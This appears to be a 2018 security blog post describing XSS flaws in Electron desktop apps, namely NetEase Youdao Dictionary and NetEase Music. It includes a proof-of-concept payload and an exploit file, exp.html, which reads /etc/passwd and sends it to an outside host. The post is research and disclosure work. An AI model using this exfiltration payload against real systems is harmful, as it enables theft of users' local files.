<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>SOME INTERESTING THINGS IN ELECTRON(Essays) | 蓝知</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">SOME INTERESTING THINGS IN ELECTRON(Essays)</h1><a id="logo" href="/.">蓝知</a><p class="description">蓝知更鸟 是种蓝背红胸的美丽小鸟。</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">SOME INTERESTING THINGS IN ELECTRON(Essays)</h1><div class="post-meta">Jun 22, 2018</div><div class="post-content"><p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2018-06-22</p>
<h4 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h4><p>Recently, I was studying lambda(function as a service) and Machine Learning, and I will share with you the case of security.<br>Today I will share two sweet foods about electron.</p>
<p>“If you can build a website, you can build a desktop app. Electron is a framework for creating native applications with web technologies like JavaScript, HTML, and CSS. It takes care of the hard parts so you can focus on the core of your application.”</p>
<h4 id="XSS-In-NetEase-Youdao-Dictionary"><a href="#XSS-In-NetEase-Youdao-Dictionary" class="headerlink" title="XSS In NetEase Youdao Dictionary"></a>XSS In NetEase Youdao Dictionary</h4><p>The first case was when I used a dictionary to look up words. NetEase Youdao dictionary has a built-in browser, we can drag files into it. We can drag an html file into it. This led to the XSS vulnerability. It’s really interesting.</p>
<figure class="highlight javascript"><figcaption><span>payload.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> prompt(<span class="number">1</span>,<span class="built_in">document</span>.location.href)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/demo1.gif" alt="demo1"></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15295869214299.jpg" alt=""></p>
<p>We can see that it is under the file origin. So we try to read other files on the computer</p>
<figure class="highlight javascript"><figcaption><span>exp.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> getFile = <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">            fetch(<span class="string">"/etc/passwd"</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> res.text()</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">text</span>=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">        sendFile(text);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> sendFile = <span class="function">(<span class="params">text</span>)=&gt;</span>&#123;</span><br><span class="line">    fetch(<span class="string">`https://blue.exeye.io/?file=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(text)&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  getFile();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15295868828387.jpg" alt=""></p>
<p>This is very interesting because it is under modern browsers. The file domain name also follows the same origin policy. If it is under a modern browser such as chrome firefox safari. It is not allowed to read files across directories.</p>
<blockquote>
<p> chrome url file://        document.origin = null<br> firefox   url file://        document.origin = undefined<br> safari    url file://        document.origin = null</p>
</blockquote>
<p>After we can read the victim’s file, we can read .git to read all the victim’s files in Mac OS.</p>
<h4 id="XSS-In-Netease-Music"><a href="#XSS-In-Netease-Music" class="headerlink" title="XSS In Netease Music"></a>XSS In Netease Music</h4><p>NetEase cloud music was cracked by others using XSS vulnerabilities. Netease Cloud repaired part. In the process of my reverse of the client. I found a strict CSP strategy for developers to fix the program. Although developers fixed bugs, I found similar vulnerability.</p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15295876814303.jpg" alt=""></p>
<p>I can’t bypass the CSP strategy.</p>
<h4 id="In-Conclusion"><a href="#In-Conclusion" class="headerlink" title="In Conclusion"></a>In Conclusion</h4><p>XSS not only exists in web pages, it also exists in the electron framework if you find an XSS application in the desktop. Try to find the privileged domain and determine if it is under the file domain. There may be RCE vulnerabilities in privileged domains and arbitrary read vulnerabilities may occur in the file domain.</p>
<p>There are also many XSS vulnerabilities that exist in desktop applications. Here only an attack surface is shown to everyone. This is just a dessert. Please wait for me to take the next study.</p>
<p>NetEase Youdao Dictionary Version: 2.3.1 (158)<br>Netease Music Version: 1.5.9 (622)</p>
</div><div class="tags"></div><div class="post-nav"><a href="/2017/12/02/Neglected-Web-Security-thought/" class="next">Neglected Web Security thought</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://magicbluech.github.io"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/06/22/SOME-INTERESTING-THINGS-IN-ELECTRON/">SOME INTERESTING THINGS IN ELECTRON(Essays)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/02/Neglected-Web-Security-thought/">Neglected Web Security thought</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/15/VelocityServlet-Expression-language-Injection/">VelocityServlet  Expression-language  Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/24/一个xss的利用-location-pathname-situation/">一个xss的利用(location.pathname situation)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/百度v3登陆系统架构问题导致点我链接拿到你的bduss-巧用referer/">百度v3登陆系统架构问题导致点我链接拿到你的bduss(巧用referer)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/06/SOME攻击可导致点我链接蠕虫-关注/">SOME攻击可导致点我链接蠕虫+关注</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">蓝知.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>